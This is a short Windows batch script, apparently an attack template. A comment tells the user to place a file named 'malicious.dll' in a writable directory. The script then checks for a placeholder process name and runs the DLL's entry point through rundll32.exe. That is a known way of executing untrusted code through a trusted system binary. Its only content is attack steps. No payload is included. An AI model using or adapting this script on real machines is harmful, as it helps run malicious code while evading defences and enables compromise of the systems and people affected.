@echo off
REM Place malicious.dll in writable directory
tasklist | findstr "PROCESS_NAME"
rundll32.exe malicious.dll,EntryPoint